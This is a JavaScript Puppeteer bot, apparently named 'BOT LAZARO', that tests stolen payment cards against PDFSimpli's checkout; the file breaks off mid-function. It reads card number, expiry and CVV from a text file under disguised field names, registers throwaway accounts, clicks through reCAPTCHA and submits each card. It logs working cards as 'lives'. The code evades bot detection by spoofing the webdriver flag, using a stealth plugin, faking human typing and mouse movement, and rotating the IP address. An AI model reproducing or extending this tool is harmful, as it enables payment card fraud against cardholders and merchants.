// ======================================================
//  ⚡ CYBER NEON THEME — BY McMetric (INTEGRADO)
// ======================================================

const COLORS_NEON = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",

    neonCyan: "\x1b[96m",
    neonMagenta: "\x1b[95m",
    neonBlue: "\x1b[94m",
    neonPurple: "\x1b[35m",
    neonPink: "\x1b[91m",
    neonGreen: "\x1b[92m",
    neonYellow: "\x1b[93m",
};

// Guardamos logs originales
const _log = console.log;
const _warn = console.warn;
const _error = console.error;

console.log = (...msg) => {
    _log(COLORS_NEON.neonCyan + COLORS_NEON.bright + "▶ " + msg.join(" ") + COLORS_NEON.reset);
};
console.warn = (...msg) => {
    _warn(COLORS_NEON.neonYellow + COLORS_NEON.bright + "⚠ " + msg.join(" ") + COLORS_NEON.reset);
};
console.error = (...msg) => {
    _error(COLORS_NEON.neonPink + COLORS_NEON.bright + "✖ ERROR: " + msg.join(" ") + COLORS_NEON.reset);
};

// 🔥 Banner Cyber-NEON
console.log(
    COLORS_NEON.neonMagenta +
    COLORS_NEON.bright +
`
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║    ██████╗  ██████╗ ████████╗     ██╗   ██╗███████╗██████╗ ███████╗  ║
║    ██╔══██╗██╔═══██╗╚══██╔══╝     ██║   ██║██╔════╝██╔══██╗██╔════╝  ║
║    ██║  ██║██║   ██║   ██║   ███████║   ██║█████╗  ██████╔╝█████╗    ║
║    ██║  ██║██║   ██║   ██║   ██╔══██║   ██║██╔══╝  ██╔══██╗██╔══╝    ║
║    ██████╔╝╚██████╔╝   ██║   ██║  ██║██╗██║███████╗██║  ██║███████╗  ║
║    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  ║
║                                                                      ║
║           🟣 BOT LAZARO — CYBER NEON MODE ACTIVATED 🟣               ║
║                        by McMetric & Anthony98                        ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
`
+ COLORS_NEON.reset
);

// ======================================================
// 🤖 HUMANIZER PRO v1.0 — By McMeTrIC
// ======================================================

class Humanizer {
    constructor(page) {
        this.page = page;
    }

    // Random entre min y max
    random(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // Pequeños delays humanos
    async delay(min = 50, max = 180) {
        return new Promise(res => setTimeout(res, this.random(min, max)));
    }

    // Pausa como si pensara
    async think(min = 600, max = 2000) {
        return new Promise(res => setTimeout(res, this.random(min, max)));
    }

    // =========================================
    // ✍️ Escritura HUMANA (con errores)
    // =========================================
    async type(selector, text) {
        const element = await this.page.$(selector);
        if (!element) {
            console.error(`Elemento no encontrado: ${selector}`);
            return;
        }
        
        // Hacer clic en el elemento primero
        await this.click(selector);
        
        // Limpiar campo si tiene contenido
        await this.page.evaluate(el => el.value = '', element);
        await this.delay(100, 300);
        
        for (const char of text) {
            // 5% probabilidad de error
            if (Math.random() < 0.05) {
                await this.page.keyboard.type("x", { delay: this.random(30, 80) });
                await this.page.keyboard.press("Backspace");
                await this.delay();
            }

            await this.page.keyboard.type(char, { delay: this.random(60, 150) });
        }
        await this.think(); // como si pensara luego de escribir
    }

    // =========================================
    // 🖱️ Movimiento de mouse HUMANO
    // =========================================
    async moveMouseSmooth(x, y) {
        try {
            const steps = this.random(15, 35);
            const currentPos = await this.page.mouse.position();
            
            for (let i = 0; i < steps; i++) {
                const progress = i / steps;
                const nx = currentPos.x + (x - currentPos.x) * progress + this.random(-2, 2);
                const ny = currentPos.y + (y - currentPos.y) * progress + this.random(-2, 2);

                await this.page.mouse.move(nx, ny);
                await this.delay(5, 25);
            }
        } catch (error) {
            // Fallback simple
            await this.page.mouse.move(x, y);
        }
    }

    // =========================================
    // 🖱️ Hover humano (pasa por encima)
    // =========================================
    async hover(selector) {
        const el = await this.page.$(selector);
        if (!el) return;

        const box = await el.boundingBox();
        if (!box) return;

        const x = box.x + box.width / 2 + this.random(-10, 10);
        const y = box.y + box.height / 2 + this.random(-10, 10);

        await this.moveMouseSmooth(x, y);
        await this.delay(100, 300);
    }

    // =========================================
    // 📜 Scroll HUMANO
    // =========================================
    async scrollRandom() {
        const total = this.random(300, 900);
        const direction = Math.random() > 0.5 ? 1 : -1; // Arriba o abajo

        for (let i = 0; i < total; i += this.random(20, 60)) {
            await this.page.evaluate((amount) => {
                window.scrollBy(0, amount);
            }, direction * this.random(10, 60));
            await this.delay(20, 80);
        }

        await this.think();
    }

    // =========================================
    // 🖱️ Clic humano
    // =========================================
    async click(selector) {
        await this.hover(selector);

        // 2% de micro pausa antes del clic
        if (Math.random() < 0.02) {
            await this.think(200, 600);
        }

        // Hacer clic con delay humano
        await this.page.click(selector, { 
            delay: this.random(40, 120) 
        });
        
        // Pausa después del clic
        await this.delay(100, 300);
    }

    // =========================================
    // 🎭 Acción humana random extra
    // =========================================
    async randomHumanAction() {
        const r = Math.random();

        if (r < 0.2) return this.scrollRandom();       // Scroll
        if (r < 0.4) return this.think(800, 2000);     // Pensar
        if (r < 0.6) {
            // Movimiento sin sentido
            return this.moveMouseSmooth(
                this.random(0, 500),
                this.random(0, 500)
            );
        }

        // Nada, solo pequeño delay
        return this.delay(100, 500);
    }

    // =========================================
    // 🤖 Quitar huellas de BOT
    // =========================================
    async removeBotDetect() {
        await this.page.evaluateOnNewDocument(() => {
            // Eliminar webdriver
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
            
            // Chrome runtime
            window.chrome = { runtime: {} };
            
            // Plugins
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
            
            // Languages
            Object.defineProperty(navigator, 'languages', {
                get: () => ['es-ES', 'es', 'en-US', 'en'],
            });
            
            // Permissions
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );
        });
    }
}

// ======================================================
// 🔥 BOT LAZARO – BRAIN ENGINE (TERMUX XVFB MODE)
// ======================================================

const puppeteer = require('puppeteer-core');
const fs = require('fs').promises;
const path = require('path');

class PDFSimpliBot {
    constructor() {
        // 🔥 CAMBIO: Rutas actualizadas para coincidir con DUA9.js
        this.baseDir = "/data/data/com.termux/files/home/botdata";
        this.logFile = path.join(this.baseDir, "bot_log.txt");
        this.cuentasFile = path.join(this.baseDir, "cuentas_pdfsimpli.json");
        this.livesFile = path.join(this.baseDir, "lives.txt");

        // 🔥 CAMBIO: Lista de rutas Chromium como en DUA9.js
        this.CHROMIUM_PATHS = [
            "/data/data/com.termux/files/usr/bin/chromium-browser",
        ];

        this.browser = null;
        this.page = null;
        this.humanizer = null; // 🔥 NUEVO: Instancia de Humanizer

        this.tarjetas = [];
        this.tarjetaIndex = 0;

        this.cuentasProcesadas = 0;
        this.cardsThisAccount = 0;
    }

    delay(ms) { return new Promise(res => setTimeout(res, ms)); }

    async log(msg) {
        console.log(msg); // SOLO EL MENSAJE, SIN FECHA/HORA
        await fs.appendFile(this.logFile, `[${new Date().toISOString()}] ${msg}\n`);
    }

    async ensureDir(d) {
        try { await fs.mkdir(d, { recursive: true }); } catch (_) { }
    }

    // 🔥 NUEVO: Método para encontrar Chromium como en DUA9.js
    async findChromium() {
        for (const p of this.CHROMIUM_PATHS) {
            try { 
                await fs.access(p); 
                return p; 
            } catch (_) { }
        }
        throw new Error("❌ Chromium no encontrado");
    }

    async deepFind(selector) {
        let el = await this.page.$(selector);
        if (el) return el;
        for (const f of this.page.frames()) {
            try {
                el = await f.$(selector);
                if (el) return el;
            } catch (_) { }
        }
        return null;
    }
    
    // =============================================================
    // ESPERA ESPECIAL PARA CAPTCHA (Termux Boosted)
    // =============================================================
    async waitForCaptchaReady(maxWait = 20000) {
        await this.log("⏳ Esperando iframe de reCAPTCHA...");

        const start = Date.now();

        while (Date.now() - start < maxWait) {
            const isReady = await this.page.evaluate(() => {
                const f = document.querySelector("iframe[src*='recaptcha']");
                return f !== null;
            });

            if (isReady) {
                await this.log("🟢 reCAPTCHA iframe cargado");
                return true;
            }

            await this.delay(500);
        }

        await this.log("⚠️ reCAPTCHA no apareció (timeout)");
        return false;
    }

    // =============================================================
    // CLICK UNIVERSAL CON HUMANIZER
    // =============================================================
    async ultraClick(selector) {
        await this.log(`🖱️ Intentando clic en: ${selector}`);
        
        for (let i = 0; i < 5; i++) {
            const el = await this.deepFind(selector);
            if (el) {
                try {
                    // Usar humanizer para clic humano
                    await this.humanizer.click(selector);
                    await this.humanizer.delay(100, 300);
                    return true;
                } catch (error) {
                    await this.log(`⚠️ Error en clic humano, intento ${i + 1}: ${error.message}`);
                    
                    // Fallback: clic directo
                    try {
                        await el.click();
                        await this.humanizer.delay(100, 300);
                        return true;
                    } catch (_) { }
                }
            }
            
            // Acción humana aleatoria mientras espera
            await this.humanizer.randomHumanAction();
            await this.delay(350);
        }
        
        await this.log(`❌ No se pudo hacer clic en: ${selector}`);
        return false;
    }

    // =============================================================
    // ESPERA PARA RENDERIZADO COMPLETO (ULTRA ESTABLE)
    // =============================================================
    async waitForPageReady() {
        await this.log("⏳ Esperando renderizado completo de la página...");

        // Acción humana mientras espera
        await this.humanizer.randomHumanAction();

        // ============================
        // 1️⃣ Esperar Network Idle
        // ============================
        try {
            await this.page.waitForNetworkIdle({
                idleTime: 1000,
                timeout: 15000
            });
        } catch (err) {
            await this.log("⚠️ Network idle no alcanzado, continuando...");
        }

        // ============================
        // 2️⃣ Esperar que el DOM esté estable
        // ============================
        await this.page.evaluate(() => {
            return new Promise((resolve) => {

                // Si ya cargó el DOM completo → seguimos
                if (document.readyState === "complete") {
                    resolve();
                    return;
                }

                let timeoutId;

                const finish = () => {
                    clearTimeout(timeoutId);
                    observer.disconnect();
                    resolve();
                };

                const observer = new MutationObserver(() => {
                    clearTimeout(timeoutId);
                    timeoutId = setTimeout(finish, 500); // DOM estable 0.5s
                });

                observer.observe(document.body, {
                    childList: true,
                    subtree: true,
                    attributes: true
                });

                // Timeout de seguridad por si la página nunca termina
                timeoutId = setTimeout(finish, 3000);
            });
        });

        // ============================
        // 3️⃣ Espera adicional para elementos críticos
        // ============================
        await this.humanizer.think(800, 1500);
        await this.log("✅ Página completamente renderizada");
    }

    // =============================================================
    // SIMULAR PENSAMIENTO HUMANO
    // =============================================================
    async simulateHumanThinking() {
        await this.log("🤔 Simulando pensamiento humano...");
        
        const actions = [
            () => this.humanizer.scrollRandom(),
            () => this.humanizer.think(1000, 3000),
            () => this.humanizer.randomHumanAction(),
            async () => {
                await this.page.mouse.move(
                    this.humanizer.random(100, 500),
                    this.humanizer.random(100, 500)
                );
            }
        ];
        
        // Ejecutar 1-3 acciones aleatorias
        const numActions = this.humanizer.random(1, 3);
        for (let i = 0; i < numActions; i++) {
            const action = actions[this.humanizer.random(0, actions.length - 1)];
            await action();
        }
    }

    // =============================================================
    // INIT (TERMUX + XVFB READY) CON HUMANIZER
    // =============================================================
    async initialize() {
        await this.ensureDir(this.baseDir);
        await this.ensureDir(path.join(this.baseDir, "documents"));
        await this.ensureDir(path.join(this.baseDir, "downloads"));

        // 🔥 CAMBIO: Usar método findChromium en lugar de ruta fija
        const chromium = await this.findChromium();

        // ======================================================
        // 🔥 LAUNCHER ANTI-DETECCIÓN PARA TERMUX (XVFB + STEALTH)
        // ======================================================
        const puppeteerExtra = require("puppeteer-extra");
        const StealthPlugin = require("puppeteer-extra-plugin-stealth");
        puppeteerExtra.use(StealthPlugin());

        // Reemplaza puppeteer por puppeteerExtra
        this.browser = await puppeteerExtra.launch({
            headless: false, // <-- NUNCA uses "new" en móviles
            executablePath: chromium,
            ignoreHTTPSErrors: true,
            defaultViewport: null,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-software-rasterizer",
                "--disable-infobars",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-blink-features=AutomationControlled",
                "--disable-web-security",
                "--ignore-certificate-errors",
                "--mute-audio",

                // ⚡ BOOST: evita que el render se "duerma"
                "--disable-background-timer-throttling",
                "--disable-renderer-backgrounding",
                "--disable-backgrounding-occluded-windows",

                // ⚡ carga mínima para teléfonos
                "--single-process",
                "--disable-low-res-tiling",
                "--disable-extensions",

                "--window-size=1280,720",

                // Pantalla virtual Termux / XVFB
                `--display=${process.env.DISPLAY || ":99"}`
            ]
        });

        this.page = await this.browser.newPage();

        // 🔥 INICIALIZAR HUMANIZER
        this.humanizer = new Humanizer(this.page);
        await this.humanizer.removeBotDetect();

        // User-Agent real del ROG Phone 9
        await this.page.setUserAgent(
            "Mozilla/5.0 (Linux; Android 16; ASUSAI2501D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        );

        // Limpieza anti-recaptcha
        await this.page.evaluateOnNewDocument(() => {
            localStorage.clear();
            sessionStorage.clear();
        });

        // Activar WebGL por software
        await this.page.evaluateOnNewDocument(() => {
            const canvas = document.createElement("canvas");
            canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        });

        await this.page.setViewport({ width: 1920, height: 1080 });

        await this.log("🚀 BOT LAZARO — Iniciado con HUMANIZER PRO + LAUNCHER ANTI-DETECCIÓN");
    }

    // =============================================================
    // IP SYSTEM
    // =============================================================
    async getIP() {
        try {
            const res = await fetch("https://api.ipify.org?format=json", {
                method: "GET",
                timeout: 5000
            }).catch(() => null);

            if (!res) {
                await this.log("⚠️ Sin internet — esperando reconexión...");
                return "0.0.0.0"; 
            }

            const data = await res.json().catch(() => null);
            if (!data || !data.ip) return "0.0.0.0";

            return data.ip;

        } catch (e) {
            await this.log("⚠️ Error leyendo IP: " + e.message);
            return "0.0.0.0";
        }
    }

    async rotacionManualSiToca() {
        if (this.cuentasProcesadas === 0) return;
        if (this.cuentasProcesadas % 2 !== 0) return;

        await this.log("🔄 ROTACIÓN IP MANUAL — ACTIVAR MODO AVIÓN AHORA");
        await this.log("⏳ Esperando cambio REAL de IP…");

        let ipInicial = await this.getIP();
        await this.log(`📌 IP inicial detectada: ${ipInicial}`);

        while (true) {
            await this.delay(3000);
            let ipNueva = await this.getIP();

            if (ipNueva && ipNueva !== ipInicial && ipNueva !== "0.0.0.0") {
                await this.log(`🟢 IP CAMBIADA — ${ipInicial} → ${ipNueva}`);
                await this.delay(2000);

                // =======================================================
                // 🔥🔥🔥 LIMPIEZA TOTAL DEL NAVEGADOR
                // =======================================================
                try {
                    await this.log("🧹 Limpiando navegador por cambio de IP...");

                    const contexts = this.browser.browserContexts();
                    for (const ctx of contexts) {
                        try {
                            const pages = await ctx.pages();
                            for (const p of pages) {
                                await p.evaluate(() => {
                                    try {
                                        localStorage.clear();
                                        sessionStorage.clear();
                                    } catch (_) {}
                                });
                            }
                            await ctx.clearPermissionOverrides();
                        } catch (_) {}
                    }

                    const client = await this.page.target().createCDPSession();
                    await client.send('Network.clearBrowserCache');
                    await client.send('Network.clearBrowserCookies');

                    await this.log("🧼 Limpieza completada ✔️");

                } catch (e) {
                    await this.log("⚠️ Error limpiando navegador: " + e.message);
                }
                // =======================================================

                return;
            }

            if (!ipNueva || ipNueva === "0.0.0.0") {
                await this.log("⚠️ Sin internet — esperando reconexión...");
            } else {
                await this.log(`⚠️ Misma IP (${ipNueva})... esperando cambio...`);
            }
        }
    }

    // =============================================================
    // TARJETAS
    // =============================================================
    async loadAllTarjetas() {
        const raw = await fs.readFile(path.join(this.baseDir, "tarjetas.txt"), "utf8");
        this.tarjetas = raw
            .split(/\r?\n/)
            .map(l => l.trim())
            .filter(Boolean)
            .map(line => {
                const [cedula, mes, anio, ruc] = line.split("|");
                return { cedula, mes, anio, ruc };
            });

        this.tarjetaIndex = 0;
        this.cardsThisAccount = 0;

        await this.log(`💾 Tarjetas cargadas: ${this.tarjetas.length}`);
    }

    getNextTarjeta() {
        if (this.tarjetaIndex >= this.tarjetas.length) return null;
        const t = this.tarjetas[this.tarjetaIndex];
        this.tarjetaIndex++;
        return t;
    }

    async guardarCedulaValida(t) {
        const line = `${t.cedula}|${t.mes}|${t.anio}|${t.ruc}|VALIDA|${new Date().toISOString()}\n`;
        await fs.appendFile(this.livesFile, line);
        
        // 🔥 MOSTRAR TARJETA VÁLIDA EN FILA ORDENADA
        console.log(`${COLORS_NEON.neonGreen}══════════════════════════════════════════════════════════════════${COLORS_NEON.reset}`);
        console.log(`${COLORS_NEON.neonGreen}${COLORS_NEON.bright}🏦 TARJETA VÁLIDA ENCONTRADA 🏦${COLORS_NEON.reset}`);
        console.log(`${COLORS_NEON.neonGreen}${COLORS_NEON.bright}🟢 Live: ${t.cedula}${COLORS_NEON.reset}`);
        console.log(`${COLORS_NEON.neonGreen}${COLORS_NEON.bright}🗓️  Exp: ${t.mes}/${t.anio}${COLORS_NEON.reset}`);
        console.log(`${COLORS_NEON.neonGreen}${COLORS_NEON.bright}🔑 CVV: ${t.ruc}${COLORS_NEON.reset}`);
        console.log(`${COLORS_NEON.neonGreen}${COLORS_NEON.bright}⏰ Hora: ${new Date().toLocaleTimeString()}${COLORS_NEON.reset}`);
        console.log(`${COLORS_NEON.neonGreen}══════════════════════════════════════════════════════════════════${COLORS_NEON.reset}`);
    }

    async eliminarTarjetaDelArchivo(tarjeta) {
        try {
            const file = path.join(this.baseDir, "tarjetas.txt");
            const raw = await fs.readFile(file, "utf8");

            const lineToRemove = `${tarjeta.cedula}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.ruc}`;

            const newData = raw
                .split(/\r?\n/)
                .filter(l => l.trim() && l.trim() !== lineToRemove)
                .join("\n");

            await fs.writeFile(file, newData);
            await this.log(`🗑️ Tarjeta eliminada: ${lineToRemove}`);

        } catch (e) {
            await this.log("⚠️ Error eliminando tarjeta: " + e.message);
        }
    }

    async guardarTarjetaEnArchivo(tarjeta, esValida) {
        try {
            const file = path.join(
                this.baseDir,
                esValida ? "validas.txt" : "invalidas.txt"
            );

            const line = `${tarjeta.cedula}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.ruc}|${
                esValida ? "VALIDA" : "INVALIDA"
            }|${new Date().toISOString()}\n`;

            await fs.appendFile(file, line);

            await this.log(
                `📦 Tarjeta movida a ${esValida ? "validas.txt" : "invalidas.txt"}: ${
                    tarjeta.cedula
                }`
            );

        } catch (e) {
            await this.log("⚠️ Error guardando tarjeta: " + e.message);
        }
    }

    // =============================================================
    // SUBIR PDF + 5s EXTRA
    // =============================================================
    async uploadPDF() {
        await this.log("📄 Buscando input file...");
        await this.simulateHumanThinking();
        
        const input = await this.deepFind('input[type="file"]');

        if (!input) throw new Error("❌ Input file no encontrado");

        const docs = path.join(this.baseDir, "documents");
        const files = await fs.readdir(docs);
        const pdf = files.find(f => f.endsWith(".pdf"));
        if (!pdf) throw new Error("❌ No hay PDF");

        const pdfPath = path.join(docs, pdf);
        await input.uploadFile(pdfPath);

        await this.log("📁 PDF subido: " + pdfPath);
        await this.humanizer.think(8000, 11000); // Espera más humana
    }

    async clickLetsGetStarted() {
        await this.log("🔍 GET STARTED...");
        await this.simulateHumanThinking();
        
        let ok = await this.ultraClick("#preEditPop");

        if (!ok) {
            ok = await this.page.evaluate(() => {
                for (const b of document.querySelectorAll("button,div,a")) {
                    if ((b.innerText || "").toLowerCase().includes("get started")) {
                        b.click(); return true;
                    }
                }
                return false;
            });
        }

        if (!ok) throw new Error("❌ GET STARTED no encontrado");
        await this.humanizer.think(2000, 4000);
        await this.log("🟢 GET STARTED presionado");
    }

    async clickConvert() {
        await this.log("⚙️ Esperando Convert...");
        await this.simulateHumanThinking();

        let btn = null;

        for (let i = 0; i < 20; i++) {
            for (const f of this.page.frames()) {
                btn =
                    await f.$("#ConvertContinue") ||
                    await f.$("button[data-test='convert']") ||
                    await f.$(".button-convert");

                if (btn) break;
            }

            if (btn) break;

            if (i % 5 === 0)
                await this.log(`⏳ Convert intento ${i}/20`);

            await this.humanizer.delay(700, 1100);
        }

        if (!btn) throw new Error("❌ Convert no apareció");

        // Usar humanizer para clic más humano
        await this.humanizer.click(btn);
        await this.humanizer.think(4000, 7000);
        await this.log("🟢 Convert presionado");
    }

    async clickDownload() {
        await this.log("⬇️ DOWNLOAD...");
        await this.simulateHumanThinking();

        await this.page._client().send("Page.setDownloadBehavior", {
            behavior: "allow",
            downloadPath: path.join(this.baseDir, "downloads")
        });

        const ok = await this.ultraClick("#congDwnaut");
        if (!ok) {
            await this.log("⚠️ DOWNLOAD no disponible ahora");
            return false;
        }

        await this.humanizer.think(4000, 7000);
        await this.log("📥 DOWNLOAD presionado");
        return true;
    }

    async handleRegistration() {
        await this.log("🧑‍💻 Registro...");
        await this.simulateHumanThinking();

        const emailInput = await this.deepFind("#email");
        if (!emailInput) {
            await this.log("✔️ No pidió registro");
            return;
        }

        const passInput = await this.deepFind("#password");

        const email = `user${Date.now()}${this.humanizer.random(1000, 9999)}@gmail.com`;
        const pass = "P" + Math.random().toString(36).slice(2, 10) + "!";

        // Usar humanizer para escribir
        await this.humanizer.type("#email", email);
        await this.humanizer.delay(800, 1500);
        
        if (passInput) {
            await this.humanizer.type("#password", pass);
            await this.humanizer.delay(800, 1500);
        }

        await this.ultraClick("#sign-up");

        await this.log("⏳ CAPTCHA...");

        // 🟢 Espera a que el iframe del captcha esté cargado
        await this.waitForCaptchaReady();

        // 🟢 Ahora sí ejecutar solver
        const solver = new CaptchaSolver(this.page, this.log.bind(this));
        await solver.solve();

        await this.humanizer.think(1500, 2500);
        await this.log(`🟢 Cuenta creada: ${email}`);
    }

    async safeFindContinueButton() {
        try {
            for (const f of this.page.frames()) {
                const btn =
                    await f.$("#planPageContinueButton") ||
                    await f.$("button[data-test='continue']") ||
                    await f.$(".continue-button");
                if (btn) return btn;
            }

            const handle = await this.page.evaluateHandle(() => {
                const tags = ["button", "a", "div", "input"];
                for (const t of tags) {
                    for (const el of document.querySelectorAll(t)) {
                        const txt = (el.innerText || el.value || "").toLowerCase();
                        if (txt.includes("continue")) return el;
                    }
                }
                return null;
            });

            if (handle && handle.asElement) return handle.asElement();
            return null;

        } catch (e) {
            console.log("❌ safeFindContinueButton:", e);
            return null;
        }
    }

    async waitAndClickContinueToPayment() {
        await this.log("🔍 Buscando CONTINUE (plan)...");
        await this.simulateHumanThinking();

        let btn = null;

        for (let i = 0; i < 20; i++) {
            btn = await this.safeFindContinueButton();
            if (btn) break;
            if (i % 5 === 0) await this.log(`⏳ CONTINUE intento ${i}/20`);
            await this.humanizer.delay(800, 1500);
        }

        if (!btn) throw new Error("❌ CONTINUE no apareció");

        // Usar humanizer para clic
        await this.humanizer.click(btn);
        await this.humanizer.think(3000, 5000);
        await this.log("🟢 CONTINUE presionado → entrando a pago...");
    }

    // =============================================================
    // FORMULARIO COMPLETO — CON HUMANIZER
    // =============================================================
    async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
        // 🔥 NUEVO: Esperar renderizado completo antes de comenzar
        await this.waitForPageReady();
        
        await this.log("🧾 Llenando formulario COMPLETO (humano + autoreparación)...");
        await this.simulateHumanThinking();

        const intentar = async (intento) => {
            await this.log(`📝 Intento de llenado #${intento + 1}`);

            try {
                // Buscar campo nombre
                const nombreField =
                    await this.deepFind("#checkout_form_card_name") ||
                    await this.deepFind("[name='cardName']");

                if (!nombreField) throw new Error("Campo nombre no encontrado");

                // Escribir nombre con humanizer
                await this.humanizer.type("#checkout_form_card_name, [name='cardName']", nombre);
                await this.humanizer.delay(800, 1200);

                // Seleccionar mes
                await this.page.waitForSelector("select[name='ccMonthExp'], #expmo", { timeout: 60000 });
                await this.humanizer.delay(200, 400);

                const mesOk = await this.page.evaluate((mesStr) => {
                    const s = document.querySelector("select[name='ccMonthExp'], #expmo");
                    if (!s) return false;
                    const v = String(parseInt(mesStr, 10));
                    s.value = v;
                    s.dispatchEvent(new Event("change", { bubbles: true }));
                    return true;
                }, mes);

                if (!mesOk) throw new Error("Error mes");
                await this.humanizer.delay(800, 1200);

                // Seleccionar año
                await this.page.waitForSelector("select[name='ccYearExp'], #expyr", { timeout: 60000 });
                await this.humanizer.delay(200, 400);

                const anioOk = await this.page.evaluate((anioStr) => {
                    const s = document.querySelector("select[name='ccYearExp'], #expyr");
                    if (!s) return false;
                    const v = String(parseInt(anioStr, 10));
                    s.value = v;
                    s.dispatchEvent(new Event("change", { bubbles: true }));
                    return true;
                }, anio);

                if (!anioOk) throw new Error("Error año");
                await this.humanizer.delay(800, 1200);

                // Buscar campo tarjeta
                let cedulaField = null;
                const frames = this.page.frames();

                for (const f of frames) {
                    const cand = await f.$("input[name='cardNumber'], input#data");
                    if (!cand) continue;
                    const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
                    if (maxLen && parseInt(maxLen, 10) >= 15) {
                        cedulaField = cand;
                        break;
                    }
                }

                if (!cedulaField) throw new Error("Campo tarjeta no encontrado");

                // Escribir tarjeta con humanizer
                await this.humanizer.type("input[name='cardNumber'], input#data", cedula);
                await this.humanizer.delay(600, 1000);

                // Buscar campo RUC/CVV
                let rucField = null;
                for (const f of frames) {
                    const cand = await f.$("input#data[name='Data'], input[maxlength='4']");
                    if (!cand) continue;
                    const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
                    if (maxLen === "4") {
                        rucField = cand;
                        break;
                    }
                }

                if (!rucField) throw new Error("Campo RUC no encontrado");

                // Escribir RUC con humanizer
                await this.humanizer.type("input#data[name='Data'], input[maxlength='4']", ruc);
                await this.humanizer.delay(500, 800);

                // Checkbox
                let checkbox = await this.deepFind("#acceptCheckboxMark");
                if (!checkbox) throw new Error("Checkbox no encontrado");

                await this.humanizer.click("#acceptCheckboxMark");
                await this.humanizer.delay(300, 600);

                // Botón submit
                let submit = await this.deepFind("#btnChargeebeeSubmit");
                if (!submit) throw new Error("Submit no encontrado");

                await this.page.evaluate(
                    el => el.scrollIntoView({ behavior: "instant" }),
                    submit
                );

                await this.humanizer.delay(400, 700);
                await submit.click();

                await this.humanizer.think(1500, 2500);
                await this.log("🚀 Pago enviado (COMPLETO HUMANO)");

                return true;

            } catch (e) {
                await this.log("⚠️ Error llenando: " + e.message);
                return false;
            }
        };

        for (let i = 0; i < 3; i++) {
            const ok = await intentar(i);
            if (ok) return true;

            await this.log("🔄 Reparando formulario… limpiando campos…");

            try {
                await this.page.evaluate(() => {
                    const clean = (sel) => {
                        const el = document.querySelector(sel);
                        if (el) el.value = "";
                    };

                    clean("#checkout_form_card_name");
                    clean("[name='cardName']");
                    clean("input[name='cardNumber']");
                    clean("input#data[name='Data']");
                });
            } catch (_) { }

            await this.humanizer.think(1000, 2000);
        }

        throw new Error("No se pudo llenar formulario completo en 3 intentos");
    }
}

// =============================================================
// CAPTCHA SOLVER UNIVERSAL
// =============================================================
class CaptchaSolver {
    constructor(page, log = console.log) {
        this.page = page;
        this.log = log;
    }

    delay(ms) { return new Promise(res => setTimeout(res, ms)); }

    async solve() {
        try {
            await this.delay(2000);
            let anchor = null, frameFound = null;

            await this.log("🔍 Buscando CAPTCHA...");

            for (let i = 0; i < 12; i++) {
                for (const f of this.page.frames()) {
                    anchor =
                        await f.$("#recaptcha-anchor") ||
                        await f.$(".recaptcha-checkbox-checkmark") ||
                        await f.$(".recaptcha-checkbox");

                    if (anchor) {
                        frameFound = f;
                        await this.log(`✅ CAPTCHA encontrado`);
                        break;
                    }
                }
                if (anchor) break;
                await this.delay(700);
            }

            if (!anchor) {
                await this.log("⏩ No hay CAPTCHA");
                return true;
            }

            const box = await anchor.boundingBox();
            if (box) {
                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                await this.delay(100);
                await this.page.mouse.down();
                await this.delay(80);
                await this.page.mouse.up();
            } else {
                await anchor.click();
            }

            await this.delay(3000);

            for (let i = 0; i < 5; i++) {
                try {
                    const ok = await frameFound.$eval(
                        "#recaptcha-anchor",
                        el => el.getAttribute("aria-checked") === "true"
                    );
                    if (ok) {
                        await this.log("🟢 CAPTCHA resuelto");
                        return true;
                    }
                } catch (_) { }
                await this.delay(1200);
            }

            await this.log("⚠️ CAPTCHA manual");
            await this.delay(8000);
            return true;

        } catch (e) {
            await this.log("⚠️ Error captcha: " + e.message);
            return true;
        }
    }
}

// =============================================================
// FLUJO RÁPIDO — CON HUMANIZER
// =============================================================
PDFSimpliBot.prototype.fillCardFast = async function (cedula, ruc) {
    // 🔥 NUEVO: Esperar renderizado completo antes de comenzar
    await this.waitForPageReady();
    
    await this.log("⚡ FLUJO RÁPIDO: modo humano + autoreparación...");
    await this.simulateHumanThinking();

    const intentar = async (intento) => {
        await this.log(`📝 Intento rápido #${intento + 1}`);

        try {
            let cedulaField = null;
            let rucField = null;
            const frames = this.page.frames();

            // Buscar campo tarjeta
            for (const f of frames) {
                const cand = await f.$("input[name='cardNumber'], input#data");
                if (!cand) continue;
                const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
                if (maxLen && parseInt(maxLen, 10) >= 15) {
                    cedulaField = cand;
                    break;
                }
            }

            if (!cedulaField) throw new Error("Campo tarjeta no encontrado (rápido)");

            // Escribir tarjeta con humanizer
            await this.humanizer.type("input[name='cardNumber'], input#data", cedula);
            await this.humanizer.delay(500, 800);

            // Buscar campo RUC
            for (const f of frames) {
                const cand = await f.$("input#data[name='Data'], input[maxlength='4']");
                if (!cand) continue;
                const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
                if (maxLen === "4") {
                    rucField = cand;
                    break;
                }
            }

            if (!rucField) throw new Error("Campo RUC no encontrado (rápido)");

            // Escribir RUC con humanizer
            await this.humanizer.type("input#data[name='Data'], input[maxlength='4']", ruc);
            await this.humanizer.delay(400, 700);

            // Botón submit
            let submit = await this.deepFind("#btnChargeebeeSubmit");
